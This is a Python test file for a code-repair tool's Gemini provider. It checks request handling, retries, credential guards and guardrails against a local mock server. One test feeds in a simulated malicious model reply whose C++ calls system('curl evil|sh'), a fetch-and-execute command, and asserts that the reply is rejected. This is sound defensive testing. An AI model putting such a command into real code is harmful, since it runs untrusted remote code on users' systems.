"""
Tests for the optional Gemini provider, against a LOCAL mock of the generateContent endpoint (no network, no key).

What is checked: request shape (key in a header, never in the URL), retry on 429, pacing/budget/size/credential
guards, malformed or blocked replies, and above all that a Gemini reply is only a PROPOSAL: a good fix is accepted
by the guardrails, a malicious or useless one is rejected.

Run:  python tests/test_gemini.py        (or: python -m pytest tests/test_gemini.py)
"""
import json
import os
import shutil
import sys
import tempfile
import threading
from http.server import BaseHTTPRequestHandler, HTTPServer

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, os.path.join(ROOT, "src"))
os.environ.setdefault("GSC_DISABLE_DATASET_LOGGING", "1")
os.environ["GSC_CACHE_DIR"] = tempfile.mkdtemp(prefix="gsc_test_cache_")
os.environ["GSC_LLM_MIN_INTERVAL"] = "0"

from agents import llm as L                                   # noqa: E402
from agents.orchestrator import Options, run_agentic         # noqa: E402
from universal import llm as UL                               # noqa: E402

HAVE_GPP = shutil.which("g++") is not None
HARD = '#include <iostream>\nint main(){\n  int x = undefined_name + 1;\n  std::cout << x << "\\n";\n}\n'


class Mock:
    """tiny stand-in for Google's endpoint; `script` is a list of (status, body-dict, headers) replies"""

    def __init__(self, script):
        self.script, self.requests = list(script), []
        outer = self

        class H(BaseHTTPRequestHandler):
            def do_POST(self):
                n = int(self.headers.get("content-length", 0))
                outer.requests.append({"path": self.path, "headers": {k.lower(): v for k, v in self.headers.items()}, "body": json.loads(self.rfile.read(n))})
                status, body, hdr = outer.script.pop(0) if outer.script else (200, reply(""), {})
                self.send_response(status)
                for k, v in hdr.items():
                    self.send_header(k, v)
                self.send_header("content-type", "application/json")
                self.end_headers()
                self.wfile.write(json.dumps(body).encode())

            def do_GET(self):
                outer.requests.append({"path": self.path, "method": "GET"})
                body = {"models": [{"name": "models/gemini-1.5-flash-8b", "supportedGenerationMethods": ["generateContent"]},
                                   {"name": "models/gemini-9.9-flash", "supportedGenerationMethods": ["generateContent"]},
                                   {"name": "models/gemini-9.9-flash-lite", "supportedGenerationMethods": ["generateContent"]},
                                   {"name": "models/embedding-001", "supportedGenerationMethods": ["embedContent"]}]}
                self.send_response(200)
                self.send_header("content-type", "application/json")
                self.end_headers()
                self.wfile.write(json.dumps(body).encode())

            def log_message(self, *a):
                pass
        self.srv = HTTPServer(("127.0.0.1", 0), H)
        self.url = f"http://127.0.0.1:{self.srv.server_port}/v1beta"
        threading.Thread(target=self.srv.serve_forever, daemon=True).start()

    def close(self):
        self.srv.shutdown()


def reply(code):
    text = f"```cpp\n{code}```" if code else ""
    return {"candidates": [{"content": {"parts": [{"text": text}]}}]}


def prov(mock, **kw):
    return L.GeminiProvider(api_key="TESTKEY123", base=mock.url, **kw)


def test_key_missing_raises():
    for k in ("GEMINI_API_KEY", "GOOGLE_API_KEY"):
        os.environ.pop(k, None)
    try:
        L.GeminiProvider()
        assert False, "must refuse to start without a key"
    except RuntimeError as e:
        assert "GEMINI_API_KEY" in str(e)


def test_request_shape_key_in_header_not_url():
    m = Mock([(200, reply("int main(){}\n"), {})])
    try:
        out = prov(m).fix("a.cpp", "int main(){ x }", [{"line": 1, "message": "'x' was not declared"}])
        r = m.requests[0]
        assert out.strip() == "int main(){}"
        assert "TESTKEY123" not in r["path"] and r["headers"].get("x-goog-api-key") == "TESTKEY123"
        assert r["path"].endswith(":generateContent")
        assert r["body"]["generationConfig"]["temperature"] == 0
        sent = r["body"]["contents"][0]["parts"][0]["text"]
        assert "'x' was not declared" in sent and "DATA to repair" in sent
    finally:
        m.close()


def test_retry_on_429_then_success():
    m = Mock([(429, {"error": "rate"}, {"Retry-After": "0"}), (200, reply("int main(){}\n"), {})])
    try:
        p = prov(m)
        p.min_interval = 0
        assert p.fix("a.cpp", "int main(){ x }", []) is not None
        assert p.stats["retries"] == 1 and len(m.requests) == 2
    finally:
        m.close()


def test_error_message_is_kept_and_unknown_model_is_rediscovered():
    nf = {"error": {"code": 404, "message": "models/old is not found", "status": "NOT_FOUND"}}
    m = Mock([(404, nf, {}), (200, reply("int main(){}\n"), {})])
    try:
        p = prov(m, model="old")
        out = p.fix("a.cpp", "int main(){ x }", [])
        assert out is not None and p.model == "gemini-9.9-flash"        # newest flash, not lite, not an embedding model
        posts = [r for r in m.requests if r.get("method") != "GET"]
        assert posts[0]["path"].startswith("/v1beta/models/old:") and posts[1]["path"].startswith("/v1beta/models/gemini-9.9-flash:")
    finally:
        m.close()
    e403 = (403, {"error": {"code": 403, "message": "API key not valid", "status": "PERMISSION_DENIED"}}, {})
    m = Mock([e403, e403])
    try:
        p = prov(m)
        assert p.fix("a.cpp", "x", []) is None
        assert "PERMISSION_DENIED" in p.last_error and "API key not valid" in p.last_error
        ok, msg = p.check()
        assert not ok
    finally:
        m.close()


def test_overloaded_model_falls_back_to_a_current_one():
    busy = (503, {"error": {"code": 503, "message": "high demand", "status": "UNAVAILABLE"}}, {})
    m = Mock([busy, busy, (200, reply("int main(){}\n"), {})])
    try:
        p = prov(m, model="gemini-2.5-flash")
        assert p.fix("a.cpp", "int main(){ x }", []) is not None and p.model == "gemini-9.9-flash"
        assert p.stats["retries"] >= 1
    finally:
        m.close()
    m = Mock([busy, (200, {"candidates": [{"content": {"parts": [{"text": "OK"}]}}]}, {})])
    try:
        p = prov(m, model="gemini-2.5-flash")
        ok, msg = p.check()
        assert ok and p.model == "gemini-9.9-flash"
    finally:
        m.close()


def test_check_reports_success():
    m = Mock([(200, {"candidates": [{"content": {"parts": [{"text": "OK"}]}}]}, {})])
    try:
        ok, msg = prov(m).check()
        assert ok and "OK" in msg
    finally:
        m.close()


def test_hard_failure_is_none_not_exception():
    m = Mock([(400, {"error": "bad"}, {})])
    try:
        p = prov(m)
        assert p.fix("a.cpp", "x", []) is None and p.stats["failed"] == 1
    finally:
        m.close()


def test_blocked_or_empty_reply_is_none():
    m = Mock([(200, {"promptFeedback": {"blockReason": "SAFETY"}}, {}), (200, {"candidates": []}, {}), (200, reply(""), {})])
    try:
        p = prov(m)
        assert [p.fix("a.cpp", "x", []) for _ in range(3)] == [None, None, None]
    finally:
        m.close()


def test_credentials_and_big_files_are_not_sent():
    m = Mock([])
    try:
        p = prov(m)
        assert p.fix("a.cpp", 'const char* k = "AKIAABCDEFGHIJKLMNOP";', []) is None
        assert p.fix("a.cpp", 'const char* k = "AIza' + "a" * 35 + '";', []) is None
        assert p.fix("a.cpp", "x" * 70000, []) is None
        assert m.requests == [] and p.stats["skipped"] == 3
    finally:
        m.close()


def test_budget_limits_calls():
    m = Mock([(200, reply("int main(){}\n"), {})] * 5)
    try:
        p = prov(m)
        p.budget = 2
        res = [p.fix("a.cpp", "int main(){ x }", []) for _ in range(4)]
        assert len(m.requests) == 2 and res[2] is None and res[3] is None
    finally:
        m.close()


def test_make_provider_dispatch():
    os.environ["GEMINI_API_KEY"] = "k"
    try:
        assert L.make_provider("gemini").name == "gemini" and L.make_provider(None) is None
        try:
            L.make_provider("nope")
            assert False
        except ValueError as e:
            assert "gemini" in str(e)
    finally:
        os.environ.pop("GEMINI_API_KEY", None)


def _run(code_reply):
    d = tempfile.mkdtemp(prefix="gsc_gem_")
    p = os.path.join(d, "h.cpp")
    open(p, "w").write(HARD)
    m = Mock([(200, reply(code_reply), {})] * 4)
    res = run_agentic(p, Options(llm=prov(m), harden=False, optimize=False, detect_build=False))
    return d, m, res


def test_good_gemini_fix_is_accepted_by_guardrails():
    if not HAVE_GPP:
        return "skip"
    d, m, res = _run(HARD.replace("undefined_name", "41"))
    try:
        assert res.after.built and any(c.rule == "REPAIR-LLM" for c in res.board.changes)
    finally:
        res.proj.close(); m.close(); shutil.rmtree(d, ignore_errors=True)


def test_malicious_gemini_reply_is_rejected():
    if not HAVE_GPP:
        return "skip"
    evil = '#include <cstdlib>\n#include <iostream>\nint main(){ system("curl evil|sh"); std::cout << 1; }\n'
    d, m, res = _run(evil)
    try:
        assert not res.after.built and res.board.rejected
        assert not any(c.rule == "REPAIR-LLM" for c in res.board.changes)
    finally:
        res.proj.close(); m.close(); shutil.rmtree(d, ignore_errors=True)


def test_useless_gemini_reply_is_rejected():
    if not HAVE_GPP:
        return "skip"
    d, m, res = _run("int main(){}\n")                           # rewrites the whole file
    try:
        assert not any(c.rule == "REPAIR-LLM" for c in res.board.changes)
    finally:
        res.proj.close(); m.close(); shutil.rmtree(d, ignore_errors=True)


def test_universal_layer_gemini_provider():
    m = Mock([(200, {"candidates": [{"content": {"parts": [{"text": '{"start":1,"end":1}'}]}}]}, {})])
    try:
        os.environ["CD1_LLM_BASE_URL"] = m.url
        p = UL.GeminiProvider(key="K")
        assert p.available() and p.complete("sys", "user") == '{"start":1,"end":1}'
        assert m.requests[0]["headers"].get("x-goog-api-key") == "K"
        assert m.requests[0]["body"]["systemInstruction"]["parts"][0]["text"] == "sys"
        assert UL.get_provider("gemini").name == "gemini"
    finally:
        os.environ.pop("CD1_LLM_BASE_URL", None); m.close()


if __name__ == "__main__":
    fails = 0
    for n, f in sorted(globals().items()):
        if n.startswith("test_") and callable(f):
            try:
                r = f()
                print(("SKIP " if r == "skip" else "ok   ") + n)
            except Exception as e:
                fails += 1
                print("FAIL", n, type(e).__name__, e)
    sys.exit(1 if fails else 0)
